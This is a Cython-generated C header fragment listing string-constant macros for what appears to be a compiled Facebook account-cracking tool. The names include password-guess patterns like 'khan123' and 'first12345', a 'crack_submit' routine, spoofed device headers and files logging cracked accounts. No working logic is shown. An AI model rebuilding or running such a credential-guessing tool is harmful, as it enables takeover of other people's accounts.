#define __pyx_kp_s_X_FB_Connection_Bandwidth __pyx_mstate_global->__pyx_kp_s_X_FB_Connection_Bandwidth
#define __pyx_kp_s_X_FB_Connection_Type __pyx_mstate_global->__pyx_kp_s_X_FB_Connection_Type
#define __pyx_kp_s_X_FB_Friendly_Name __pyx_mstate_global->__pyx_kp_s_X_FB_Friendly_Name
#define __pyx_kp_s_X_FB_HTTP_Engine __pyx_mstate_global->__pyx_kp_s_X_FB_HTTP_Engine
#define __pyx_kp_s_X_FB_Net_HNI __pyx_mstate_global->__pyx_kp_s_X_FB_Net_HNI
#define __pyx_kp_s_X_FB_SIM_HNI __pyx_mstate_global->__pyx_kp_s_X_FB_SIM_HNI
#define __pyx_n_s_Y __pyx_mstate_global->__pyx_n_s_Y
#define __pyx_n_s_Yes __pyx_mstate_global->__pyx_n_s_Yes
#define __pyx_kp_s_Your_Subscription_Date_Expire __pyx_mstate_global->__pyx_kp_s_Your_Subscription_Date_Expire
#define __pyx_n_s_Z __pyx_mstate_global->__pyx_n_s_Z
#define __pyx_n_s__110 __pyx_mstate_global->__pyx_n_s__110
#define __pyx_kp_u__20 __pyx_mstate_global->__pyx_kp_u__20
#define __pyx_kp_s__22 __pyx_mstate_global->__pyx_kp_s__22
#define __pyx_kp_u__22 __pyx_mstate_global->__pyx_kp_u__22
#define __pyx_kp_s__25 __pyx_mstate_global->__pyx_kp_s__25
#define __pyx_kp_s__29 __pyx_mstate_global->__pyx_kp_s__29
#define __pyx_n_s__31 __pyx_mstate_global->__pyx_n_s__31
#define __pyx_kp_s__52 __pyx_mstate_global->__pyx_kp_s__52
#define __pyx_kp_s__63 __pyx_mstate_global->__pyx_kp_s__63
#define __pyx_kp_s__68 __pyx_mstate_global->__pyx_kp_s__68
#define __pyx_kp_u__72 __pyx_mstate_global->__pyx_kp_u__72
#define __pyx_kp_s__75 __pyx_mstate_global->__pyx_kp_s__75
#define __pyx_kp_u__76 __pyx_mstate_global->__pyx_kp_u__76
#define __pyx_kp_u__77 __pyx_mstate_global->__pyx_kp_u__77
#define __pyx_kp_u__91 __pyx_mstate_global->__pyx_kp_u__91
#define __pyx_kp_u__92 __pyx_mstate_global->__pyx_kp_u__92
#define __pyx_n_s_a __pyx_mstate_global->__pyx_n_s_a
#define __pyx_kp_s_a_code_to_use __pyx_mstate_global->__pyx_kp_s_a_code_to_use
#define __pyx_n_s_aa __pyx_mstate_global->__pyx_n_s_aa
#define __pyx_n_s_accept __pyx_mstate_global->__pyx_n_s_accept
#define __pyx_kp_s_accept_encoding __pyx_mstate_global->__pyx_kp_s_accept_encoding
#define __pyx_kp_s_accept_language __pyx_mstate_global->__pyx_kp_s_accept_language
#define __pyx_n_s_accessToken __pyx_mstate_global->__pyx_n_s_accessToken
#define __pyx_n_s_adid __pyx_mstate_global->__pyx_n_s_adid
#define __pyx_n_s_afghan123 __pyx_mstate_global->__pyx_n_s_afghan123
#define __pyx_n_s_afghan1234 __pyx_mstate_global->__pyx_n_s_afghan1234
#define __pyx_n_s_afghan12345 __pyx_mstate_global->__pyx_n_s_afghan12345
#define __pyx_n_s_agent __pyx_mstate_global->__pyx_n_s_agent
#define __pyx_n_s_allow_redirects __pyx_mstate_global->__pyx_n_s_allow_redirects
#define __pyx_n_s_am __pyx_mstate_global->__pyx_n_s_am
#define __pyx_n_s_android_version __pyx_mstate_global->__pyx_n_s_android_version
#define __pyx_n_s_api __pyx_mstate_global->__pyx_n_s_api
#define __pyx_n_s_api1 __pyx_mstate_global->__pyx_n_s_api1
#define __pyx_n_s_api1_locals_genexpr __pyx_mstate_global->__pyx_n_s_api1_locals_genexpr
#define __pyx_n_s_api_locals_genexpr __pyx_mstate_global->__pyx_n_s_api_locals_genexpr
#define __pyx_n_s_append __pyx_mstate_global->__pyx_n_s_append
#define __pyx_kp_s_application_x_www_form_urlencode __pyx_mstate_global->__pyx_kp_s_application_x_www_form_urlencode
#define __pyx_n_s_args __pyx_mstate_global->__pyx_n_s_args
#define __pyx_n_s_asyncio_coroutines __pyx_mstate_global->__pyx_n_s_asyncio_coroutines
#define __pyx_n_s_authenticate __pyx_mstate_global->__pyx_n_s_authenticate
#define __pyx_n_s_b __pyx_mstate_global->__pyx_n_s_b
#define __pyx_n_s_base64 __pyx_mstate_global->__pyx_n_s_base64
#define __pyx_n_s_bd __pyx_mstate_global->__pyx_n_s_bd
#define __pyx_n_s_bd_locals_genexpr __pyx_mstate_global->__pyx_n_s_bd_locals_genexpr
#define __pyx_n_s_build __pyx_mstate_global->__pyx_n_s_build
#define __pyx_n_s_button_with_disabled __pyx_mstate_global->__pyx_n_s_button_with_disabled
#define __pyx_n_s_c __pyx_mstate_global->__pyx_n_s_c
#define __pyx_n_s_c_user __pyx_mstate_global->__pyx_n_s_c_user
#define __pyx_n_s_check_output __pyx_mstate_global->__pyx_n_s_check_output
#define __pyx_n_s_checkpoint __pyx_mstate_global->__pyx_n_s_checkpoint
#define __pyx_n_s_choice __pyx_mstate_global->__pyx_n_s_choice
#define __pyx_n_s_choices __pyx_mstate_global->__pyx_n_s_choices
#define __pyx_n_s_clear __pyx_mstate_global->__pyx_n_s_clear
#define __pyx_n_s_client_country_code __pyx_mstate_global->__pyx_n_s_client_country_code
#define __pyx_n_s_cline_in_traceback __pyx_mstate_global->__pyx_n_s_cline_in_traceback
#define __pyx_n_s_close __pyx_mstate_global->__pyx_n_s_close
#define __pyx_n_s_code __pyx_mstate_global->__pyx_n_s_code
#define __pyx_kp_s_com_facebook_adsmanager __pyx_mstate_global->__pyx_kp_s_com_facebook_adsmanager
#define __pyx_kp_s_com_facebook_katana __pyx_mstate_global->__pyx_kp_s_com_facebook_katana
#define __pyx_kp_s_com_facebook_lite __pyx_mstate_global->__pyx_kp_s_com_facebook_lite
#define __pyx_kp_s_com_facebook_mlite __pyx_mstate_global->__pyx_kp_s_com_facebook_mlite
#define __pyx_kp_s_com_facebook_orca __pyx_mstate_global->__pyx_kp_s_com_facebook_orca
#define __pyx_n_s_community_id __pyx_mstate_global->__pyx_n_s_community_id
#define __pyx_n_s_complete __pyx_mstate_global->__pyx_n_s_complete
#define __pyx_n_s_concurrent_futures __pyx_mstate_global->__pyx_n_s_concurrent_futures
#define __pyx_n_s_cookies __pyx_mstate_global->__pyx_n_s_cookies
#define __pyx_n_s_cpl __pyx_mstate_global->__pyx_n_s_cpl
#define __pyx_n_s_cps __pyx_mstate_global->__pyx_n_s_cps
#define __pyx_n_s_crack_submit __pyx_mstate_global->__pyx_n_s_crack_submit
#define __pyx_n_s_credentials_type __pyx_mstate_global->__pyx_n_s_credentials_type
#define __pyx_n_s_currently_logged_in_userid __pyx_mstate_global->__pyx_n_s_currently_logged_in_userid
#define __pyx_n_s_cx __pyx_mstate_global->__pyx_n_s_cx
#define __pyx_n_s_d __pyx_mstate_global->__pyx_n_s_d
#define __pyx_n_s_data __pyx_mstate_global->__pyx_n_s_data
#define __pyx_kp_s_density_4_0_width_1440_height_3 __pyx_mstate_global->__pyx_kp_s_density_4_0_width_1440_height_3
#define __pyx_kp_s_density_4_0_width_1440_height_3_2 __pyx_mstate_global->__pyx_kp_s_density_4_0_width_1440_height_3_2
#define __pyx_n_s_device __pyx_mstate_global->__pyx_n_s_device
#define __pyx_n_s_device_id __pyx_mstate_global->__pyx_n_s_device_id
#define __pyx_n_s_digits __pyx_mstate_global->__pyx_n_s_digits
#define __pyx_kp_u_disable __pyx_mstate_global->__pyx_kp_u_disable
#define __pyx_n_s_dnt __pyx_mstate_global->__pyx_n_s_dnt
#define __pyx_n_s_document __pyx_mstate_global->__pyx_n_s_document
#define __pyx_kp_s_domain __pyx_mstate_global->__pyx_kp_s_domain
#define __pyx_n_s_domain_2 __pyx_mstate_global->__pyx_n_s_domain_2
#define __pyx_n_s_dump __pyx_mstate_global->__pyx_n_s_dump
#define __pyx_n_s_e __pyx_mstate_global->__pyx_n_s_e
#define __pyx_n_s_email __pyx_mstate_global->__pyx_n_s_email
#define __pyx_kp_s_en_US_FB4A_FBAV __pyx_mstate_global->__pyx_kp_s_en_US_FB4A_FBAV
#define __pyx_kp_s_en_US_en_q_0_9 __pyx_mstate_global->__pyx_kp_s_en_US_en_q_0_9
#define __pyx_kp_s_en_us_10_T_Mobile_myTouch_3G_Sli __pyx_mstate_global->__pyx_kp_s_en_us_10_T_Mobile_myTouch_3G_Sli
#define __pyx_kp_u_enable __pyx_mstate_global->__pyx_kp_u_enable
#define __pyx_n_s_enroll_misauth __pyx_mstate_global->__pyx_n_s_enroll_misauth
#define __pyx_n_s_enter __pyx_mstate_global->__pyx_n_s_enter
#define __pyx_n_s_error __pyx_mstate_global->__pyx_n_s_error
#define __pyx_n_s_error_data __pyx_mstate_global->__pyx_n_s_error_data
#define __pyx_n_s_error_detail_type __pyx_mstate_global->__pyx_n_s_error_detail_type
#define __pyx_n_s_error_msg __pyx_mstate_global->__pyx_n_s_error_msg
#define __pyx_n_s_exceptions __pyx_mstate_global->__pyx_n_s_exceptions
#define __pyx_n_s_exit __pyx_mstate_global->__pyx_n_s_exit
#define __pyx_n_s_exit_2 __pyx_mstate_global->__pyx_n_s_exit_2
#define __pyx_n_s_f __pyx_mstate_global->__pyx_n_s_f
#define __pyx_n_s_false __pyx_mstate_global->__pyx_n_s_false
#define __pyx_n_s_family __pyx_mstate_global->__pyx_n_s_family
#define __pyx_n_s_family_device_id __pyx_mstate_global->__pyx_n_s_family_device_id
#define __pyx_n_s_fb_api_req_friendly_name __pyx_mstate_global->__pyx_n_s_fb_api_req_friendly_name
#define __pyx_n_s_fban __pyx_mstate_global->__pyx_n_s_fban
#define __pyx_n_s_fbav __pyx_mstate_global->__pyx_n_s_fbav
#define __pyx_n_s_fbbd __pyx_mstate_global->__pyx_n_s_fbbd
#define __pyx_n_s_fbbv __pyx_mstate_global->__pyx_n_s_fbbv
#define __pyx_n_s_fbca __pyx_mstate_global->__pyx_n_s_fbca
#define __pyx_n_s_fbcr __pyx_mstate_global->__pyx_n_s_fbcr
#define __pyx_n_s_fbdm __pyx_mstate_global->__pyx_n_s_fbdm
#define __pyx_n_s_fbdv __pyx_mstate_global->__pyx_n_s_fbdv
#define __pyx_n_s_fbfw __pyx_mstate_global->__pyx_n_s_fbfw
#define __pyx_n_s_fbks __pyx_mstate_global->__pyx_n_s_fbks
#define __pyx_n_s_fblc __pyx_mstate_global->__pyx_n_s_fblc
#define __pyx_n_s_fbmf __pyx_mstate_global->__pyx_n_s_fbmf
#define __pyx_n_s_fbpn __pyx_mstate_global->__pyx_n_s_fbpn
#define __pyx_n_s_fbrv __pyx_mstate_global->__pyx_n_s_fbrv
#define __pyx_n_s_fbsv __pyx_mstate_global->__pyx_n_s_fbsv
#define __pyx_n_s_ffb __pyx_mstate_global->__pyx_n_s_ffb
#define __pyx_n_s_fikr __pyx_mstate_global->__pyx_n_s_fikr
#define __pyx_n_s_file __pyx_mstate_global->__pyx_n_s_file
#define __pyx_n_s_first __pyx_mstate_global->__pyx_n_s_first
#define __pyx_n_s_first123 __pyx_mstate_global->__pyx_n_s_first123
#define __pyx_n_s_first12345 __pyx_mstate_global->__pyx_n_s_first12345
#define __pyx_n_s_first_name __pyx_mstate_global->__pyx_n_s_first_name
#define __pyx_n_s_firstlast __pyx_mstate_global->__pyx_n_s_firstlast
#define __pyx_n_s_firstlast123 __pyx_mstate_global->__pyx_n_s_firstlast123
#define __pyx_n_s_fkeyx __pyx_mstate_global->__pyx_n_s_fkeyx
#define __pyx_n_s_flow __pyx_mstate_global->__pyx_n_s_flow
#define __pyx_kp_u_flow_login_no_pin_refsrc_deprec __pyx_mstate_global->__pyx_kp_u_flow_login_no_pin_refsrc_deprec
#define __pyx_n_s_flush __pyx_mstate_global->__pyx_n_s_flush
#define __pyx_n_s_fn __pyx_mstate_global->__pyx_n_s_fn
#define __pyx_n_s_fo __pyx_mstate_global->__pyx_n_s_fo
#define __pyx_kp_s_for_log_in __pyx_mstate_global->__pyx_kp_s_for_log_in
#define __pyx_n_s_format __pyx_mstate_global->__pyx_n_s_format
#define __pyx_n_s_fs __pyx_mstate_global->__pyx_n_s_fs
#define __pyx_n_s_fullagnt __pyx_mstate_global->__pyx_n_s_fullagnt
#define __pyx_n_s_g __pyx_mstate_global->__pyx_n_s_g
#define __pyx_kp_u_gc __pyx_mstate_global->__pyx_kp_u_gc
#define __pyx_n_s_generate_analytics_claims __pyx_mstate_global->__pyx_n_s_generate_analytics_claims
#define __pyx_n_s_generate_machine_id __pyx_mstate_global->__pyx_n_s_generate_machine_id
#define __pyx_n_s_generate_session_cookies __pyx_mstate_global->__pyx_n_s_generate_session_cookies
#define __pyx_n_s_genexpr __pyx_mstate_global->__pyx_n_s_genexpr
#define __pyx_n_s_get __pyx_mstate_global->__pyx_n_s_get
#define __pyx_n_s_get_dict __pyx_mstate_global->__pyx_n_s_get_dict
#define __pyx_n_s_getlog __pyx_mstate_global->__pyx_n_s_getlog
#define __pyx_n_s_gmail __pyx_mstate_global->__pyx_n_s_gmail
#define __pyx_n_s_gmail_locals_genexpr __pyx_mstate_global->__pyx_n_s_gmail_locals_genexpr
#define __pyx_n_s_group __pyx_mstate_global->__pyx_n_s_group
#define __pyx_n_s_gt __pyx_mstate_global->__pyx_n_s_gt
#define __pyx_kp_s_gzip_deflate __pyx_mstate_global->__pyx_kp_s_gzip_deflate
#define __pyx_kp_s_gzip_deflate_br __pyx_mstate_global->__pyx_kp_s_gzip_deflate_br
#define __pyx_n_s_h __pyx_mstate_global->__pyx_n_s_h
#define __pyx_n_s_head __pyx_mstate_global->__pyx_n_s_head
#define __pyx_n_s_headers __pyx_mstate_global->__pyx_n_s_headers
#define __pyx_n_s_hexdigits __pyx_mstate_global->__pyx_n_s_hexdigits
#define __pyx_kp_s_https_api_whatsapp_com_send_phon __pyx_mstate_global->__pyx_kp_s_https_api_whatsapp_com_send_phon
#define __pyx_kp_s_https_b_api_facebook_com_method __pyx_mstate_global->__pyx_kp_s_https_b_api_facebook_com_method
#define __pyx_kp_s_https_b_graph_facebook_com_auth __pyx_mstate_global->__pyx_kp_s_https_b_graph_facebook_com_auth
#define __pyx_kp_s_https_free_facebook_com_login_sa __pyx_mstate_global->__pyx_kp_s_https_free_facebook_com_login_sa
#define __pyx_kp_u_https_p_facebook_com_login_devic __pyx_mstate_global->__pyx_kp_u_https_p_facebook_com_login_devic
#define __pyx_kp_s_https_p_facebook_com_login_devic_2 __pyx_mstate_global->__pyx_kp_s_https_p_facebook_com_login_devic_2
#define __pyx_n_s_i __pyx_mstate_global->__pyx_n_s_i
#define __pyx_n_s_id __pyx_mstate_global->__pyx_n_s_id
#define __pyx_n_s_idpass __pyx_mstate_global->__pyx_n_s_idpass
#define __pyx_n_s_ids __pyx_mstate_global->__pyx_n_s_ids
#define __pyx_n_s_import __pyx_mstate_global->__pyx_n_s_import
#define __pyx_n_s_initializing __pyx_mstate_global->__pyx_n_s_initializing
#define __pyx_n_s_input __pyx_mstate_global->__pyx_n_s_input
#define __pyx_n_s_is_coroutine __pyx_mstate_global->__pyx_n_s_is_coroutine
#define __pyx_kp_u_isenabled __pyx_mstate_global->__pyx_kp_u_isenabled
#define __pyx_n_s_j __pyx_mstate_global->__pyx_n_s_j
#define __pyx_n_s_j1 __pyx_mstate_global->__pyx_n_s_j1
#define __pyx_n_s_jazoest __pyx_mstate_global->__pyx_n_s_jazoest
#define __pyx_n_s_join __pyx_mstate_global->__pyx_n_s_join
#define __pyx_n_s_json __pyx_mstate_global->__pyx_n_s_json
#define __pyx_n_s_k __pyx_mstate_global->__pyx_n_s_k
#define __pyx_n_s_keys __pyx_mstate_global->__pyx_n_s_keys
#define __pyx_n_s_khan1122 __pyx_mstate_global->__pyx_n_s_khan1122
#define __pyx_n_s_khan123 __pyx_mstate_global->__pyx_n_s_khan123
#define __pyx_n_s_khan12345 __pyx_mstate_global->__pyx_n_s_khan12345
#define __pyx_n_s_khan123456 __pyx_mstate_global->__pyx_n_s_khan123456
#define __pyx_n_s_khankhan __pyx_mstate_global->__pyx_n_s_khankhan
#define __pyx_n_s_khankhan123 __pyx_mstate_global->__pyx_n_s_khankhan123
#define __pyx_n_s_krk __pyx_mstate_global->__pyx_n_s_krk
#define __pyx_kp_s_krk_py __pyx_mstate_global->__pyx_kp_s_krk_py
#define __pyx_n_s_l __pyx_mstate_global->__pyx_n_s_l
#define __pyx_n_s_last __pyx_mstate_global->__pyx_n_s_last
#define __pyx_n_s_last123 __pyx_mstate_global->__pyx_n_s_last123
#define __pyx_n_s_last1234 __pyx_mstate_global->__pyx_n_s_last1234
#define __pyx_n_s_last12345 __pyx_mstate_global->__pyx_n_s_last12345
#define __pyx_n_s_last_name __pyx_mstate_global->__pyx_n_s_last_name
#define __pyx_n_s_lchoice __pyx_mstate_global->__pyx_n_s_lchoice
#define __pyx_n_s_li __pyx_mstate_global->__pyx_n_s_li
#define __pyx_n_s_li2 __pyx_mstate_global->__pyx_n_s_li2
#define __pyx_n_s_light __pyx_mstate_global->__pyx_n_s_light
#define __pyx_n_s_limit __pyx_mstate_global->__pyx_n_s_limit
#define __pyx_n_s_linex __pyx_mstate_global->__pyx_n_s_linex
#define __pyx_n_s_lists __pyx_mstate_global->__pyx_n_s_lists
#define __pyx_n_s_ln __pyx_mstate_global->__pyx_n_s_ln
#define __pyx_n_s_locale __pyx_mstate_global->__pyx_n_s_locale
#define __pyx_n_s_login __pyx_mstate_global->__pyx_n_s_login
#define __pyx_n_s_login_no_pin __pyx_mstate_global->__pyx_n_s_login_no_pin
#define __pyx_n_s_logo __pyx_mstate_global->__pyx_n_s_logo
#define __pyx_n_s_loop __pyx_mstate_global->__pyx_n_s_loop
#define __pyx_n_s_lower __pyx_mstate_global->__pyx_n_s_lower
#define __pyx_n_s_ls __pyx_mstate_global->__pyx_n_s_ls
#define __pyx_n_s_lsd __pyx_mstate_global->__pyx_n_s_lsd
#define __pyx_n_s_mail __pyx_mstate_global->__pyx_n_s_mail
#define __pyx_n_s_main __pyx_mstate_global->__pyx_n_s_main
#define __pyx_n_s_max_workers __pyx_mstate_global->__pyx_n_s_max_workers
#define __pyx_n_s_menu __pyx_mstate_global->__pyx_n_s_menu
#define __pyx_n_s_message __pyx_mstate_global->__pyx_n_s_message
#define __pyx_n_s_meta_inf_fbmeta __pyx_mstate_global->__pyx_n_s_meta_inf_fbmeta
#define __pyx_n_s_model __pyx_mstate_global->__pyx_n_s_model
#define __pyx_n_s_mthd __pyx_mstate_global->__pyx_n_s_mthd
#define __pyx_n_s_n __pyx_mstate_global->__pyx_n_s_n
#define __pyx_n_s_name __pyx_mstate_global->__pyx_n_s_name
#define __pyx_n_s_name_2 __pyx_mstate_global->__pyx_n_s_name_2
#define __pyx_kp_s_name_jazoest_value __pyx_mstate_global->__pyx_kp_s_name_jazoest_value
#define __pyx_kp_s_name_lsd_value __pyx_mstate_global->__pyx_kp_s_name_lsd_value
#define __pyx_n_s_names __pyx_mstate_global->__pyx_n_s_names
#define __pyx_n_s_navigate __pyx_mstate_global->__pyx_n_s_navigate
#define __pyx_n_s_next __pyx_mstate_global->__pyx_n_s_next
#define __pyx_n_s_nmbr __pyx_mstate_global->__pyx_n_s_nmbr
#define __pyx_n_s_nmp __pyx_mstate_global->__pyx_n_s_nmp
#define __pyx_n_s_none __pyx_mstate_global->__pyx_n_s_none
#define __pyx_n_s_oks __pyx_mstate_global->__pyx_n_s_oks
#define __pyx_n_s_open __pyx_mstate_global->__pyx_n_s_open
#define __pyx_n_s_os __pyx_mstate_global->__pyx_n_s_os
#define __pyx_kp_s_p_facebook_com __pyx_mstate_global->__pyx_kp_s_p_facebook_com
#define __pyx_n_s_pak __pyx_mstate_global->__pyx_n_s_pak
#define __pyx_n_s_pak_locals_genexpr __pyx_mstate_global->__pyx_n_s_pak_locals_genexpr
#define __pyx_n_s_pas __pyx_mstate_global->__pyx_n_s_pas
#define __pyx_n_s_pass __pyx_mstate_global->__pyx_n_s_pass
#define __pyx_n_s_passlist __pyx_mstate_global->__pyx_n_s_passlist
#define __pyx_n_s_password __pyx_mstate_global->__pyx_n_s_password
#define __pyx_n_s_path __pyx_mstate_global->__pyx_n_s_path
#define __pyx_n_s_pcp __pyx_mstate_global->__pyx_n_s_pcp
#define __pyx_n_s_pip __pyx_mstate_global->__pyx_n_s_pip
#define __pyx_kp_s_pip_install_requests_futures_2_d __pyx_mstate_global->__pyx_kp_s_pip_install_requests_futures_2_d
#define __pyx_n_s_plist __pyx_mstate_global->__pyx_n_s_plist
#define __pyx_n_s_po __pyx_mstate_global->__pyx_n_s_po
#define __pyx_n_s_post __pyx_mstate_global->__pyx_n_s_post
#define __pyx_n_s_ppp __pyx_mstate_global->__pyx_n_s_ppp
#define __pyx_n_s_print __pyx_mstate_global->__pyx_n_s_print
#define __pyx_n_s_ps __pyx_mstate_global->__pyx_n_s_ps
#define __pyx_n_s_ps2 __pyx_mstate_global->__pyx_n_s_ps2
#define __pyx_n_s_ps_limit __pyx_mstate_global->__pyx_n_s_ps_limit
#define __pyx_n_s_psx __pyx_mstate_global->__pyx_n_s_psx
#define __pyx_n_s_public __pyx_mstate_global->__pyx_n_s_public
#define __pyx_n_s_pw __pyx_mstate_global->__pyx_n_s_pw
#define __pyx_kp_s_python_AKING_py __pyx_mstate_global->__pyx_kp_s_python_AKING_py
#define __pyx_kp_s_python_ZEA __pyx_mstate_global->__pyx_kp_s_python_ZEA
#define __pyx_kp_s_python_ZEA_py __pyx_mstate_global->__pyx_kp_s_python_ZEA_py
#define __pyx_n_s_r __pyx_mstate_global->__pyx_n_s_r
#define __pyx_n_s_randint __pyx_mstate_global->__pyx_n_s_randint
#define __pyx_n_s_random __pyx_mstate_global->__pyx_n_s_random
#define __pyx_n_s_random_seed __pyx_mstate_global->__pyx_n_s_random_seed
#define __pyx_n_s_randrange __pyx_mstate_global->__pyx_n_s_randrange
#define __pyx_n_s_range __pyx_mstate_global->__pyx_n_s_range
#define __pyx_n_s_re __pyx_mstate_global->__pyx_n_s_re
#define __pyx_kp_s_re_txt __pyx_mstate_global->__pyx_kp_s_re_txt
#define __pyx_n_s_read __pyx_mstate_global->__pyx_n_s_read
#define __pyx_n_s_replace __pyx_mstate_global->__pyx_n_s_replace
#define __pyx_n_s_requests __pyx_mstate_global->__pyx_n_s_requests
#define __pyx_kp_s_rm_rf_re_txt __pyx_mstate_global->__pyx_kp_s_rm_rf_re_txt
#define __pyx_n_s_rndm __pyx_mstate_global->__pyx_n_s_rndm
#define __pyx_n_s_rndm_locals_genexpr __pyx_mstate_global->__pyx_n_s_rndm_locals_genexpr
#define __pyx_n_s_rsplit __pyx_mstate_global->__pyx_n_s_rsplit
#define __pyx_kp_s_s_are_on __pyx_mstate_global->__pyx_kp_s_s_are_on
#define __pyx_n_s_samsung __pyx_mstate_global->__pyx_n_s_samsung
#define __pyx_kp_s_sdcard_ZEA_CP_txt __pyx_mstate_global->__pyx_kp_s_sdcard_ZEA_CP_txt
#define __pyx_kp_s_sdcard_ZEA_OK_txt __pyx_mstate_global->__pyx_kp_s_sdcard_ZEA_OK_txt
#define __pyx_kp_s_sdcard_ZEA_R_CP_txt __pyx_mstate_global->__pyx_kp_s_sdcard_ZEA_R_CP_txt
#define __pyx_kp_s_sdcard_ZEA_R_OK_txt __pyx_mstate_global->__pyx_kp_s_sdcard_ZEA_R_OK_txt
#define __pyx_n_s_search __pyx_mstate_global->__pyx_n_s_search
#define __pyx_kp_s_sec_ch_prefers_color_scheme __pyx_mstate_global->__pyx_kp_s_sec_ch_prefers_color_scheme
#define __pyx_kp_s_sec_ch_ua __pyx_mstate_global->__pyx_kp_s_sec_ch_ua
#define __pyx_kp_s_sec_ch_ua_mobile __pyx_mstate_global->__pyx_kp_s_sec_ch_ua_mobile
#define __pyx_kp_s_sec_ch_ua_platform __pyx_mstate_global->__pyx_kp_s_sec_ch_ua_platform
#define __pyx_kp_s_sec_fetch_dest __pyx_mstate_global->__pyx_kp_s_sec_fetch_dest
#define __pyx_kp_s_sec_fetch_mode __pyx_mstate_global->__pyx_kp_s_sec_fetch_mode
#define __pyx_kp_s_sec_fetch_site __pyx_mstate_global->__pyx_kp_s_sec_fetch_site
#define __pyx_kp_s_sec_fetch_user __pyx_mstate_global->__pyx_kp_s_sec_fetch_user
#define __pyx_n_s_secure __pyx_mstate_global->__pyx_n_s_secure
#define __pyx_n_s_send __pyx_mstate_global->__pyx_n_s_send
#define __pyx_n_s_session __pyx_mstate_global->__pyx_n_s_session
#define __pyx_n_s_session_key __pyx_mstate_global->__pyx_n_s_session_key
#define __pyx_kp_s_shortly_with __pyx_mstate_global->__pyx_kp_s_shortly_with
#define __pyx_n_s_sim_id __pyx_mstate_global->__pyx_n_s_sim_id
#define __pyx_n_s_sim_serials __pyx_mstate_global->__pyx_n_s_sim_serials
#define __pyx_n_s_sleep __pyx_mstate_global->__pyx_n_s_sleep
#define __pyx_n_s_source __pyx_mstate_global->__pyx_n_s_source
#define __pyx_n_s_spec __pyx_mstate_global->__pyx_n_s_spec
#define __pyx_n_s_split __pyx_mstate_global->__pyx_n_s_split
#define __pyx_n_s_splitlines __pyx_mstate_global->__pyx_n_s_splitlines
#define __pyx_n_s_start __pyx_mstate_global->__pyx_n_s_start
#define __pyx_n_s_stdout __pyx_mstate_global->__pyx_n_s_stdout
#define __pyx_n_s_string __pyx_mstate_global->__pyx_n_s_string
#define __pyx_n_s_submit __pyx_mstate_global->__pyx_n_s_submit
#define __pyx_n_s_subprocess __pyx_mstate_global->__pyx_n_s_subprocess
#define __pyx_n_s_sys __pyx_mstate_global->__pyx_n_s_sys
#define __pyx_n_s_system __pyx_mstate_global->__pyx_n_s_system
#define __pyx_n_s_test __pyx_mstate_global->__pyx_n_s_test
#define __pyx_n_s_text __pyx_mstate_global->__pyx_n_s_text
#define __pyx_kp_s_text_html_application_xhtml_xml __pyx_mstate_global->__pyx_kp_s_text_html_application_xhtml_xml
#define __pyx_n_s_throw __pyx_mstate_global->__pyx_n_s_throw
#define __pyx_n_s_time __pyx_mstate_global->__pyx_n_s_time
#define __pyx_n_s_tks __pyx_mstate_global->__pyx_n_s_tks
#define __pyx_n_s_tl __pyx_mstate_global->__pyx_n_s_tl
#define __pyx_n_s_tokenku __pyx_mstate_global->__pyx_n_s_tokenku
#define __pyx_n_s_total __pyx_mstate_global->__pyx_n_s_total
#define __pyx_n_s_total_ids __pyx_mstate_global->__pyx_n_s_total_ids
#define __pyx_n_s_tred __pyx_mstate_global->__pyx_n_s_tred
#define __pyx_n_s_true __pyx_mstate_global->__pyx_n_s_true
#define __pyx_n_s_try_num __pyx_mstate_global->__pyx_n_s_try_num
#define __pyx_n_s_twf __pyx_mstate_global->__pyx_n_s_twf
#define __pyx_n_s_ua __pyx_mstate_global->__pyx_n_s_ua
#define __pyx_n_s_uaku2 __pyx_mstate_global->__pyx_n_s_uaku2
#define __pyx_n_s_ugen __pyx_mstate_global->__pyx_n_s_ugen
#define __pyx_n_s_uid __pyx_mstate_global->__pyx_n_s_uid
#define __pyx_n_s_unknown __pyx_mstate_global->__pyx_n_s_unknown
#define __pyx_kp_s_upgrade_insecure_requests __pyx_mstate_global->__pyx_kp_s_upgrade_insecure_requests
#define __pyx_n_s_url __pyx_mstate_global->__pyx_n_s_url
#define __pyx_n_s_url_wa __pyx_mstate_global->__pyx_n_s_url_wa
#define __pyx_n_s_urllib __pyx_mstate_global->__pyx_n_s_urllib
#define __pyx_n_s_user __pyx_mstate_global->__pyx_n_s_user
#define __pyx_kp_s_user_agent __pyx_mstate_global->__pyx_kp_s_user_agent
#define __pyx_n_s_uuid __pyx_mstate_global->__pyx_n_s_uuid
#define __pyx_n_s_uuid4 __pyx_mstate_global->__pyx_n_s_uuid4
#define __pyx_kp_s_viewport_width __pyx_mstate_global->__pyx_kp_s_viewport_width
#define __pyx_n_s_write __pyx_mstate_global->__pyx_n_s_write
#define __pyx_kp_s_www_facebook_com __pyx_mstate_global->__pyx_kp_s_www_facebook_com
#define __pyx_n_s_wx __pyx_mstate_global->__pyx_n_s_wx
#define __pyx_n_s_x __pyx_mstate_global->__pyx_n_s_x
#define __pyx_n_s_xd __pyx_mstate_global->__pyx_n_s_xd
#define __pyx_kp_u_xdg_open_https_chat_whatsapp_com __pyx_mstate_global->__pyx_kp_u_xdg_open_https_chat_whatsapp_com
#define __pyx_kp_s_xdg_open_https_chat_whatsapp_com_2 __pyx_mstate_global->__pyx_kp_s_xdg_open_https_chat_whatsapp_com_2
#define __pyx_kp_s_xdg_open_https_facebook_com_grou __pyx_mstate_global->__pyx_kp_s_xdg_open_https_facebook_com_grou
#define __pyx_kp_s_xdg_open_https_www_facebook_com __pyx_mstate_global->__pyx_kp_s_xdg_open_https_www_facebook_com
#define __pyx_n_s_y __pyx_mstate_global->__pyx_n_s_y
#define __pyx_n_s_yes __pyx_mstate_global->__pyx_n_s_yes
#define __pyx_n_s_zea __pyx_mstate_global->__pyx_n_s_zea
#define __pyx_n_s_zlib __pyx_mstate_global->__pyx_n_s_zlib
#define __pyx_float_2e7 __pyx_mstate_global->__pyx_float_2e7
#define __pyx_float_3e7 __pyx_mstate_global->__pyx_float_3e7
#define __pyx_int_0 __pyx_mstate_global->__pyx_int_0
#define __pyx_int_1 __pyx_mstate_global->__pyx_int_1
#define __pyx_int_2 __pyx_mstate_global->__pyx_int_2
#define __pyx_int_11 __pyx_mstate_global->__pyx_int_11
#define __pyx_int_16 __pyx_mstate_global->__pyx_int_16
#define __pyx_int_20 __pyx_mstate_global->__pyx_int_20
#define __pyx_int_30 __pyx_mstate_global->__pyx_int_30
#define __pyx_int_40 __pyx_mstate_global->__pyx_int_40
#define __pyx_int_73 __pyx_mstate_global->__pyx_int_73
